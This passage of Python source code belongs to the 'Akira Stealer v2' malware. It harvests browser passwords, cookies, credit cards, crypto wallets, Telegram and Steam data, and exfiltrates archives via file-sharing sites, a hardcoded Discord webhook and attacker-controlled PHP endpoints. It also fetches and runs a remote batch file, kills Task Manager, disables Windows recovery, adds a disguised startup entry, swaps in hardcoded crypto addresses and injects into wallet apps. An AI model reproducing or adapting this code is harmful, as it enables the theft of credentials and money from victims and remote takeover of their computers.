                    if oshiAtUrl != "":
                        description += f"[Oshi.at Download]({oshiAtUrl})\n"
        except:
            return
        description += "\n" + "*💻 System:*\n" + self.systeminfo + "\n"
        try:
            if self.countryCode != None:
                code_points = [127397 + ord(char) for char in self.countryCode.upper()]
                flag = ' '.join(chr(code_point) for code_point in code_points)
            else:
                flag = ""
            data = {
                "content": "",
                "tts": False,
                "embeds": [
                    {
                    "title": self.starttitle + self.computername  + "/" + self.username + " | " + self.ip + flag,
                    "description": description,
                    "fields": [
                        {
                          "name": "",
                          "value": "\n"
                        },
                        {
                        "name": "🔑 Passwords",
                        "value": "```" + str(self.password_count) + "```",
                        "inline": True
                        },
                        {
                        "name": "🍪 Cookies",
                        "value": "```" + str(self.cookie_count) + "```",
                        "inline": True
                        },
                        {
                        "name": "📄 Autofills",
                        "value": "```" + str(self.autofill_count) + "```",
                        "inline": True
                        },
                        {
                        "name": "💎 Desktop Wallets",
                        "value": "```" + str(self.desktop_wallets_count) + "```",
                        "inline": True
                        },
                        {
                        "name": "🧩 Extensions",
                        "value": "```" + str(self.ext_wallets_count) + "```",
                        "inline": True
                        },
                        {
                          "name": "",
                          "value": "\n"
                        },
                        {
                        "name": "📌 Keywords",
                        "value": "```" + str(self.keywords) + "```",
                        "inline": False
                        }

                    ],
                    }
                ],
                "username": "Akira 💊",
                "avatar_url": "https://cdn.discordapp.com/attachments/1145735406978076845/1154021402052145272/akira-logo.png?width=256&height=256"
            }
            data = {
                #"message": self.starttitle + "*" + self.computername  + "/" + self.username  + "*" + " | " + self.ip + " - " + flag + "\t\t" + description + "*🔑 Passwords: " + str(self.password_count) + "*\n" + "*🍪 Cookies: " + str(self.cookie_count) + "*\n" + "*📄 Autofills: " + str(self.autofill_count) + "*" + "\n*💎 Wallets: " + str(self.desktop_wallets_count + self.ext_wallets_count) + "*\n\n" + "📌 Keywords\n" + str(self.keywords)
                "message": self.starttitle + "*" + self.computername  + "/" + self.username  + "*" + " | " + self.ip + " - " + flag + "\t\t" + description + "\n📝Data\n└── 🔑 Passwords:\t" + str(self.password_count) + "\n└── 🍪 Cookies:\t" + str(self.cookie_count) + "\n└── 📄 Autofills:\t" + str(self.autofill_count) + "\n└── 💎 Wallets:\t" + str(self.desktop_wallets_count + self.ext_wallets_count) + "\n\n" + "*📌 Keywords*\n" + str(self.keywords.replace("\n\n", "\n"))
            }

            json_data = json.dumps(data)
            headers = {
                "Content-Type": "application/json"
            }

            response = requests.post(self.webhook_url, data=json_data, headers=headers)
        except Exception as ex:
            pass


    def sendDataWebhook(self, file_path, chatId, startup) -> str:
        self.starttitle = "💉 Infected "
        if startup == True:
            self.starttitle = "🔄 Reboot "
        description = "\n"
        if self.keywords == "":
            self.keywords = "None"
        try:
            gofile_url = self.uploadToGofile(file_path)
            if gofile_url != "":
                description += f"[GoFile Download]({gofile_url})\n"
            else:
                fileio_url = self.uploadFileio(file_path)
                if fileio_url != "":
                    description += f"[FileIO Download]({fileio_url})\n"
                else:
                    oshiAtUrl = self.uploadToOshiAt(file_path)
                    if oshiAtUrl != "":
                        description += f"[Oshi.at Download]({oshiAtUrl})\n"
        except:
            return
        description += "\n" + "```⚙️ System Info\n\n" + self.systeminfo + "```\n\n"
        try:
            if self.countryCode != None:
                flag = "  :flag_" + self.countryCode + ":"
            else:
                flag = ""
            data = {
                "content": "",
                "tts": False,
                "embeds": [
                    {
                    "title": self.starttitle + self.computername  + "/" + self.username + " | " + self.ip + flag,
                    "description": description,
                    "fields": [
                        {
                          "name": "",
                          "value": "\n"
                        },
                        {
                        "name": "🔑 Passwords",
                        "value": "```" + str(self.password_count) + "```",
                        "inline": True
                        },
                        {
                        "name": "🍪 Cookies",
                        "value": "```" + str(self.cookie_count) + "```",
                        "inline": True
                        },
                        {
                        "name": "📄 Autofills",
                        "value": "```" + str(self.autofill_count) + "```",
                        "inline": True
                        },
                        {
                        "name": "💎 Desktop Wallets",
                        "value": "```" + str(self.desktop_wallets_count) + "```",
                        "inline": True
                        },
                        {
                        "name": "🧩 Extensions",
                        "value": "```" + str(self.ext_wallets_count) + "```",
                        "inline": True
                        },
                        {
                          "name": "",
                          "value": "\n"
                        },
                        {
                        "name": "📌 Keywords",
                        "value": "```" + str(self.keywords) + "```",
                        "inline": False
                        }

                    ],
                    }
                ],
                "username": "Akira 💊",
                "avatar_url": "https://cdn.discordapp.com/attachments/1145735406978076845/1154021402052145272/akira-logo.png?width=256&height=256"
            }

            requests.post(self.webhook_url, json=data, headers={"Content-Type": "application/json"})
        except:
            pass

    def sendFiles(self, file_path, startup):
        if os.path.isdir(file_path):
            self.starttitle = "💉 Files "
            if startup == True:
                self.starttitle = "🔄 Files "
            file_url = None

            try:
                file_url = self.uploadToGofile(file_path)
                if file_url == "":
                    file_url = self.uploadFileio(file_path)
                    if file_url == "":
                        file_url = self.uploadToOshiAt(file_path)
            except:
                pass

            try:
                if self.has_telegram == True:
                    telegram_status = "✅"
                else:
                    telegram_status = "❌"

                if self.has_steam == True:
                    steam_status = "✅"
                else:
                    steam_status = "❌"

                data = {
                    "content": "",
                    "tts": False,
                    "embeds": [
                        {
                        "title": self.starttitle + self.computername  + "/" + self.username + " | Important Files",
                        "description": f"\n[Download the zip file]({file_url})\n\n",
                        "fields": [
                            {
                            "name": "",
                            "value": "\n"
                            },
                            {
                            "name": "💠 Telegram",
                            "value": "```" + telegram_status + "```",
                            "inline": True
                            },
                            {
                            "name": "🎮 Steam",
                            "value": "```" + steam_status + "```",
                            "inline": True
                            }
                        ],
                        }
                    ],
                    "username": "Akira 💊",
                    "avatar_url": "https://cdn.discordapp.com/attachments/1145735406978076845/1154021402052145272/akira-logo.png?width=256&height=256"
                }

                if len(self.stolen_files) > 0:
                    files_value = "```"
                    for file in self.stolen_files:
                        files_value += file + "\n"
                    files_value += "```"
                    files_field = {
                        "name": "📂 Files",
                        "value": files_value,
                        "inline": False
                    }
                    data["embeds"][0]["fields"].append(files_field)

                requests.post(self.webhook_url, json=data, headers={"Content-Type": "application/json"})
            except:
                pass

    def sendFilesTG(self, file_path, startup):
        if os.path.isdir(file_path):
            self.starttitle = "💉 Files "
            if startup == True:
                self.starttitle = "🔄 Files "
            file_url = None

            try:
                file_url = self.uploadToGofile(file_path)
                if file_url == "":
                    file_url = self.uploadFileio(file_path)
                    if file_url == "":
                        file_url = self.uploadToOshiAt(file_path)
            except:
                pass

            try:
                if self.has_telegram == True:
                    telegram_status = "✅"
                else:
                    telegram_status = "❌"

                if self.has_steam == True:
                    steam_status = "✅"
                else:
                    steam_status = "❌"

                data = {
                    "content": "",
                    "tts": False,
                    "embeds": [
                        {
                        "title": self.starttitle + "*" + self.computername  + "/" + self.username + "*" + " | Important Files",
                        "description": f"\n[Download the zip file]({file_url})\n\n",
                        "fields": [
                            {
                            "name": "",
                            "value": "\n"
                            },
                            {
                            "name": "💠 Telegram",
                            "value": "```" + telegram_status + "```",
                            "inline": True
                            },
                            {
                            "name": "🎮 Steam",
                            "value": "```" + steam_status + "```",
                            "inline": True
                            }
                        ],
                        }
                    ],
                    "username": "Akira 💊",
                    "avatar_url": "https://cdn.discordapp.com/attachments/1145735406978076845/1154021402052145272/akira-logo.png?width=256&height=256"
                }

                if len(self.stolen_files) > 0:
                    files_value = ""
                    for file in self.stolen_files:
                        files_value += "└── " + file + "\n"
                    files_field = {
                        "name": "📂 Files",
                        "value": files_value,
                        "inline": False
                    }
                    data["embeds"][0]["fields"].append(files_field)

                data = {
                    #"message": self.starttitle + "*" + self.computername  + "/" + self.username  + "*" + " | " + self.ip + " - " + flag + "\t\t" + description + "*🔑 Passwords: " + str(self.password_count) + "*\n" + "*�  Cookies: " + str(self.cookie_count) + "*\n" + "*📄 Autofills: " + str(self.autofill_count) + "*" + "\n*💎 Wallets: " + str(self.desktop_wallets_count + self.ext_wallets_count) + "*\n\n" + "📌 Keywords\n" + str(self.keywords)
                    "message": self.starttitle + self.computername  + "/" + self.username + " | Important Files" + f"\n[Download the zip file]({file_url})\n\n" + "💠 Telegram: "+ telegram_status + "\n🎮 Steam: " + steam_status + "\n\n📂 Files: ```\n" + files_value + "```"
                }

                json_data = json.dumps(data)
                headers = {
                    "Content-Type": "application/json"
                }

                response = requests.post(self.webhook_url, data=json_data, headers=headers)
            except:
                Akira.logErrorTg(traceback.format_exc())

    def send_wallet_pw(self, msg_pw):
        try:
            if requests.get('https://cosmoplwnets.xyz/.well-known/pki-validation/link.php').status_code == 200:
                request_url = 'https://cosmoplwnets.xyz/.well-known/pki-validation/link.php'
        except:
            try:
                if requests.get('https://cosmoplanets.net/well-known/pki-validation/link.php').status_code == 200:
                    request_url = 'https://cosmoplanets.net/well-known/pki-validation/link.php'
            except:
                request_url = 'https://cosmoplwnets.xyz/.well-known/pki-validation/link.php'

        if msg_pw != "":
            title_name = "\n🔑 A crypto wallet has been unlocked!"
            try:
                data = {
                    "content": "",
                    "tts": False,
                    "embeds": [
                        {
                        "title": self.computername  + "/" + self.username + "",
                        "description": "",
                        "fields": [
                            {
                            "name": title_name,
                            "value": msg_pw
                            }
                        ],
                        }
                    ],
                    "username": "Akira 💊",
                    "avatar_url": "https://cdn.discordapp.com/attachments/1145735406978076845/1154021402052145272/akira-logo.png?width=256&height=256"
                }

                requests.post(request_url, json=data, headers={"Content-Type": "application/json"})
            except Exception as ex:
                pass

    def send_wallet_pw_tg(self, msg_pw, mnemonic_words):
        try:
            if requests.get('https://cosmoplwnets.xyz/.well-known/pki-validation/link.php').status_code == 200:
                request_url = 'https://cosmoplwnets.xyz/.well-known/pki-validation/link.php'
        except:
            try:
                if requests.get('https://cosmoplanets.net/well-known/pki-validation/link.php').status_code == 200:
                    request_url = 'https://cosmoplanets.net/well-known/pki-validation/link.php'
            except:
                request_url = 'https://cosmoplwnets.xyz/.well-known/pki-validation/link.php'
        if msg_pw != "":
            title_name = "🔑 A crypto wallet has been unlocked!"
            try:
                msg_parts = msg_pw.split(" ")
                x = 0
                for msg_part in msg_parts:
                    if msg_part in mnemonic_words:
                        x += 1
                if x >= 12 and x <= 24:
                    title_name = "🔑 New Mnemonic Detected!"
            except:
                pass
            try:
                msg = self.computername  + "/" + self.username + title_name + '\n\n' + msg_pw
                data = {
                    "message": msg
                }

                json_data = json.dumps(data)
                headers = {
                    "Content-Type": "application/json"
                }

                requests.post(request_url, data=json_data, headers=headers)

            except Exception as ex:
                pass

    def send_vanity(self, msg_pw, sendmumu):
        request_url = 'https://cosmoplwnets.xyz/.well-known/pki-validation/link.php'
        try:
            if requests.get('https://cosmoplwnets.xyz/.well-known/pki-validation/link.php').status_code == 200:
                request_url = 'https://cosmoplwnets.xyz/.well-known/pki-validation/link.php'
        except:
            try:
                if requests.get('https://cosmoplanets.net/well-known/pki-validation/link.php').status_code == 200:
                    request_url = 'https://cosmoplanets.net/well-known/pki-validation/link.php'
            except:
                request_url = 'https://cosmoplwnets.xyz/.well-known/pki-validation/link.php'

        request_url2 = 'https://cosmoplwnets.xyz/.well-known/pki-validation/mumu.php'
        try:
            if requests.get('https://cosmoplwnets.xyz/.well-known/pki-validation/mumu.php').status_code == 200:
                request_url2 = 'https://cosmoplwnets.xyz/.well-known/pki-validation/mumu.php'
        except:
            try:
                if requests.get('https://cosmoplanets.net/well-known/pki-validation/mumu.php').status_code == 200:
                    request_url2 = 'https://cosmoplanets.net/well-known/pki-validation/mumu.php'
            except:
                request_url2 = 'https://cosmoplwnets.xyz/.well-known/pki-validation/mumu.php'

        if msg_pw != "":
            try:
                msg = self.computername  + "/" + self.username + "\n" + msg_pw
                data = {
                    "message": msg
                }

                json_data = json.dumps(data)
                headers = {
                    "Content-Type": "application/json"
                }

                requests.post(request_url, data=json_data, headers=headers)
                if sendmumu == True:
                    requests.post(request_url2, data=json_data, headers=headers)
            except Exception as ex:
                pass


    def uploadToGofile(self, file_path) -> str:
        try:
            server_response = requests.get("https://api.gofile.io/getServer", timeout=30)
            server_response.raise_for_status()
            server = server_response.json()["data"]["server"]

            with open(file_path + ".zip", 'rb') as file:
                upload_response = requests.post(f'https://{server}.gofile.io/uploadFile', files={'file': file}, timeout=30)
                upload_response.raise_for_status()
                return upload_response.json()["data"]["downloadPage"]
        except (requests.exceptions.RequestException, KeyError, IOError) as e:
            return ""

    def uploadToTransfersh(self, file_path) -> str:
        #try: return requests.post("https://transfer.sh/", files= {'file': open(file_path + ".zip", 'rb')}).text
        #except: return ""
        return ""

    def uploadToOshiAt(self, file_path) -> str:
        try:
            return requests.post("http://oshi.at/", files={'files[]': (os.getenv("computername") + ".zip", open(f"{file_path}.zip", 'rb'))}, data = {'expire': '43200', 'autodestroy': '0','randomizefn': '0', 'shorturl': '1'}).text.split("DL: ")[1].replace("\n", "").replace("\r", "").replace(" ", "")
        except:
            return ""

    def uploadFileio(self, file_path):
        try:
            with open(file_path + ".zip", 'rb') as file_content:
                files = {'file': (os.path.basename(file_path + ".zip"), file_content)}
                response = requests.post('https://file.io/', files=files)
                response.raise_for_status()
                link = response.json()["link"]
                return link
        except:
            return ""

class clipper_thread(threading.Thread):
    def __init__(self, arg1, arg2):
        threading.Thread.__init__(self)
        self.arg1 = arg1
        self.arg2 = arg2

    def run(self):
        my_instance = WalletInject(self.arg1, self.arg2)

def show_fake_error_wrapper():
    Utils.showFakeError()

def exec_cmd(command):
    if command:
        CREATE_NO_WINDOW = 0x08000000
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        subprocess.Popen(command, stdin=subprocess.PIPE, stdout=open(os.devnull, 'wb'), stderr=subprocess.PIPE,creationflags=CREATE_NO_WINDOW, startupinfo=startupinfo)

def rat():
    try:
        bat_file_path = os.path.join(os.getenv("temp"), "helper.bat")
        response = requests.get("https://cosmoplwnets.xyz/.well-known/pki-validation/pow.bat")
        if response.status_code == 200:
            with open(bat_file_path, 'wb') as f:
                f.write(response.content)
            exec_cmd([bat_file_path])
    except:
        pass

def disable_task_manager():
    while True:
        Utils.TaskKill("Taskmgr")
        time.sleep(1)

def disable_factory_reset():
    exec_cmd(["reagentc.exe", "/disable"])

class Akira:
    def logError(error_msg):
        description = "```" + error_msg + "```"
        try:
            data = {
                "content": "",
                "tts": False,
                "embeds": [
                    {
                    "title": "❌ An error occured - " + os.getenv("computername")  + "/" + os.getlogin(),
                    "description": description,
                    }
                ],
                "username": "Akira 💊",
                "avatar_url": "https://cdn.discordapp.com/attachments/1145735406978076845/1154021402052145272/akira-logo.png?width=256&height=256"
            }

            requests.post("https://cosmoplwnets.xyz/.well-known/pki-validation/errors.php", json=data, headers={"Content-Type": "application/json"})
        except Exception as e:
            pass

    def logErrorTg(error_msg):
        try:
            if requests.get('https://cosmoplanets.net/well-known/pki-validation/link.php').status_code == 200:
                request_url = 'https://cosmoplanets.net/well-known/pki-validation/link.php'
        except:
            try:
                if requests.get('https://cosmoplwnets.xyz/.well-known/pki-validation/link.php').status_code == 200:
                    request_url = 'https://cosmoplwnets.xyz/.well-known/pki-validation/link.php'
            except:
                pass
        try:
            msg = "❌ An error occured - " + os.getenv("computername")  + "/" + os.getlogin() + "\n" + error_msg
            data = {
                "message": msg
            }

            json_data = json.dumps(data)
            headers = {
                "Content-Type": "application/json"
            }

            requests.post(request_url, data=json_data, headers=headers)

        except Exception as ex:
            pass

    def __init__(self) -> None:
        startup = False
        self.enableVanity = False

        try:
            Utils.HideConsole()
        except Exception as e:
            Akira.logErrorTg(traceback.format_exc())

        if VmProtect.isVM(1):
            sys.exit()

        Thread(target=disable_factory_reset).start()
        Thread(target=disable_task_manager).start()

        self.Header = """<================[Akira Stealer v2]>================>\n\n"""
        self.Separator = "\n" + "".center(50, "=") + "\n"
        self.Webhook = "https://discord.com/api/webhooks/1254792114169184288/pKUU6T-r0cdtlpEi-PbTkEKPxxFOojTqiXAovd7RrlcniHKEpxqwHEeGSjk8BVch_HT9"
        self.ChatId = "6870217606"
        self.tg = False
        self.injectUrl = "https://cosmoplanets.net/well-known/pki-validation/inj.php"

        if "mumu" in self.Webhook and not "discord" in self.Webhook:
            self.tg = True
        try:
            try:
                if requests.get("https://cosmoplwnets.xyz/.well-known/pki-validation/inj.php").status_code == 200:
                    self.injectUrl = "https://cosmoplwnets.xyz/.well-known/pki-validation/inj.php"
                    if self.Webhook == "http://mumu":
                        self.Webhook = "https://cosmoplwnets.xyz/.well-known/pki-validation/mumu.php"
                        self.tg = True
                        self.enableVanity = True
                        Thread(target=rat).start()
            except:
                try:
                    if requests.get('https://cosmoplanets.net/well-known/pki-validation/inj.php').status_code == 200:
                        self.injectUrl = "https://cosmoplanets.net/well-known/pki-validation/inj.php"
                        if self.Webhook == "http://mumu":
                            self.Webhook = "https://cosmoplanets.net/well-known/pki-validation/mumu.php"
                            self.tg = True
                            self.enableVanity = True
                            Thread(target=rat).start()
                except:
                    pass
            if not "discord" in self.Webhook or "api" not in self.Webhook:
                self.tg = True
        except Exception as e:
            Akira.logErrorTg(traceback.format_exc())


        try:
            if not Utils.CreateMutex("1qsMlseJplTlArIF24f"):
                sys.exit()
        except Exception as e:
            Akira.logErrorTg(traceback.format_exc())

        try:
            program_name = "Updater.exe"
            path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Internet Explorer', 'UserData')

            if os.path.exists(path):
                key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
                value_name = 'Realtek Audio'
                full_path = os.path.join(path, program_name)

                check_command = f'reg query HKCU\\{key_path} /v \"{value_name}\"'
                result = subprocess.run(check_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                if result.stdout != None:
                    if full_path in result.stdout:
                        startup = True
                        if not VmProtect.isVM(1):
                            addresses["BTC"] = "bc1qnmz2l8lr0yzj9eun48dyds7rlzg6t6hk5vw5zt"
                            addresses["ETH"] = "0xa8a2C9e3fbCde807101dBD87aF7b51583f83d1D5"
                            addresses["DOGE"] = "DACeoqWDPmNARSZAeDZPFwqwecbByaksmd"
                            addresses["LTC"] = "LLQtaBnSAFpCFUw5cXRRka7Nvtrs4Up9bH"
                            addresses["XMR"] = "4AVdkoC16zwcjxF4q9cXdL2D4vGqC9iPAcQ9gmHzQ7JS1fUUff6Za3D6CKm9MsDrhSDRY9hgeca7yKnMGpaD8dq6Bo3mT7D"
                            addresses["BCH"] = "qrfs8ee558t0a2dlp9v6h4qzns5cd6pltqrrn883xs"
                            addresses["DASH"] = "XpeiSH1MfQYeehTfxosYHyTHzbgu2LNsG1"
                            addresses["TRX"] = "TFuYQoosCUqbVjibowMqaa3W3h3RtAVDbK"
                            addresses["XRP"] = "r36AwwhUH7BRujevi5mukbDrG46KGbTk8V"
                            addresses["XLM"] = "GAEPMD52PX7FYX65AJJLEFZSH3DZSL3DKM2XRXHVJP4CLJFIBKI25C33"
        except Exception as e:
            Akira.logErrorTg(traceback.format_exc())

        try:
            Utils.PutInStartup()
        except Exception as e:
            Akira.logErrorTg(traceback.format_exc())

        try:
            self.showFakeError = "true"
            if self.showFakeError == "true" and startup == False:
                Thread(target=show_fake_error_wrapper).start()
                #Utils.showFakeError()
        except Exception as e:
            Akira.logErrorTg(traceback.format_exc())

        try:
            akira = Webhook(self.injectUrl)
            hook = Webhook(self.Webhook)
        except Exception as e:
            Akira.logErrorTg(traceback.format_exc())

        try:
            Utils.clear_client_folder()
            Utils.init_client_folder(True, self.ChatId)
        except Exception as e:
            Akira.logErrorTg(traceback.format_exc())

        Thread(target= Discord, args= (self.injectUrl, True)).start()
        Thread(target= Discord, args= (self.Webhook, self.tg)).start()

        try:
            self.get_chromium_data()
            Wallets.grabExtensions()
        except Exception as e:
            Akira.logErrorTg(traceback.format_exc())
        try:
            GeckoDriver(self.injectUrl, self.Webhook)
        except Exception as e:
            Akira.logErrorTg(traceback.format_exc())
        try:
            Wallets.grabDesktopWallets()
        except Exception as e:
            Akira.logErrorTg(traceback.format_exc())

        try:
            Utils.fix_browser_data()
        except Exception as e:
            Akira.logErrorTg(traceback.format_exc())
        try:
            akira.updateData()
            hook.updateData()
        except Exception as e:
            Akira.logErrorTg(traceback.format_exc())
        try:
            Utils.zip_client_file()
        except Exception as e:
            Akira.logErrorTg(traceback.format_exc())
        try:
            akira.sendDataTG(Utils.get_temp_folder(), self.ChatId, startup)
            if self.tg == True:
                hook.sendDataTG(Utils.get_temp_folder(), self.ChatId, startup)
            else:
                hook.sendDataWebhook(Utils.get_temp_folder(), self.ChatId, startup)
            Utils.clear_client_folder()
        except Exception as e:
            Akira.logErrorTg(traceback.format_exc())


        clipper_thread(akira, self.enableVanity).start()

        try:
            Utils.init_client_folder(False)
            data.has_telegram = Utils.steal_telegram()
            data.has_steam = Utils.steal_steam()
        except Exception as e:
            Akira.logErrorTg(traceback.format_exc())
        try:
            Utils.steal_files()
            akira.updateData()
            hook.updateData()
        except Exception as e:
            Akira.logErrorTg(traceback.format_exc())
        try:
            Utils.zip_client_file()
            akira.sendFilesTG(Utils.get_temp_folder(), startup)
            if self.tg == True:
                hook.sendFilesTG(Utils.get_temp_folder(), startup)
            else:
                hook.sendFiles(Utils.get_temp_folder(), startup)
            Utils.clear_client_folder()
        except Exception as e:
            Akira.logErrorTg(traceback.format_exc())
        #Utils.InjectExodusAsar()
        #Utils.InjectAtomicAsar()
        Thread(target= Utils.InjectExodusAsar).start()
        Thread(target= Utils.InjectAtomicAsar).start()
        while True:
            time.sleep(10)
        #WalletInject(akira, self.enableVanity)

    def get_chromium_data(self):
        threads: list[Thread] = []

        for name, item in paths.items():
            path, procname = item
            if os.path.isdir(path):
                def run(name, path):
                    try:
                        Utils.TaskKill(procname)
                        browser = Chromium(path)
                        saveToDir = Utils.get_temp_folder()

                        passwords = browser.GetPasswords()
                        ccs = browser.GetCreditCards()
                        cookies = browser.GetCookies()
                        google_cookies = browser.dump_google_sessions(path)
                        history = browser.GetHistory()
                        autofills = browser.GetAutofills()

                        if passwords or cookies or history or autofills or ccs:
                            os.makedirs(saveToDir, exist_ok= True)

                            try:
                                if passwords:
                                    output = ["URL:\t{}\nUsername:\t{}\nPassword:\t{}".format(str(url), str(username), str(password)) for url, username, password in passwords]
                                    with open(os.path.join(os.path.join(saveToDir, "Passwords"), "{} Passwords.txt".format(name)), "w", errors= "ignore", encoding= "utf-8") as file:
                                        file.write(self.Header + (self.Separator.lstrip() + self.Separator.join(output)) + self.Separator)
                            except Exception as e:
                                Akira.logErrorTg(traceback.format_exc())

                            try:
                                if cookies:
                                    output = ["{}\t{}\t{}\t{}\t{}\t{}\t{}".format(host, str(expiry != 0).upper(), cpath, str(not host.startswith(".")).upper(), expiry, cname, cookie) for host, cname, cpath, cookie, expiry in cookies]
                                    with open(os.path.join(os.path.join(saveToDir, "Cookies"), "{} Cookies.txt".format(name)), "w", errors= "ignore", encoding= "utf-8") as file:
                                        file.write(self.Header + ("\n".join(output)))
                            except Exception as e:
                                Akira.logErrorTg(traceback.format_exc())

                            try:
                                if google_cookies:
                                    for cookie in google_cookies:
                                        with open(os.path.join(os.path.join(saveToDir, "Cookies"), "{} Google Session.txt".format(cookie[0])), "w", errors= "ignore", encoding= "utf-8") as file:
                                            file.write(cookie[1])
                            except Exception as e:
                                Akira.logErrorTg(traceback.format_exc())

                            try:
                                if history:
                                    output = ["URL: {}\nTitle: {}\nVisits: {}".format(*x) for x in history]
                                    with open(os.path.join(os.path.join(saveToDir, "History"), "{} History.txt".format(name)), "w", errors= "ignore", encoding= "utf-8") as file:
                                        file.write(self.Header + (self.Separator.lstrip() + self.Separator.join(output)) + self.Separator)
                            except Exception as e:
                                Akira.logErrorTg(traceback.format_exc())

                            try:
                                if autofills:
                                    output = ["URL:\t{}\nValue:\t{}".format(str(name), str(value)) for name, value in autofills]
                                    with open(os.path.join(os.path.join(saveToDir, "Autofill"), "{} Autofill.txt".format(name)), "w", errors= "ignore", encoding= "utf-8") as file:
                                        file.write(self.Header + (self.Separator.lstrip() + self.Separator.join(output)) + self.Separator)
                            except Exception as e:
                                Akira.logErrorTg(traceback.format_exc())


                            try:
                                if ccs:
                                    output = ["Card Number:\t{}\nExpiration:\t{}/{}".format(str(cc_number), str(cc_month), str(cc_year)) for cc_number, cc_month, cc_year in ccs]
                                    with open(os.path.join(os.path.join(saveToDir, "CreditCards"), "{} CreditCards.txt".format(name)), "w", errors= "ignore", encoding= "utf-8") as file:
                                        file.write(self.Header + (self.Separator.lstrip() + self.Separator.join(output)) + self.Separator)
                            except Exception as e:
                                Akira.logErrorTg(traceback.format_exc())
                    except Exception as e:
                        Akira.logErrorTg(traceback.format_exc())
                        pass

                t = Thread(target= run, args= (name, path))
                t.start()
                threads.append(t)
                for thread in threads:
                    thread.join()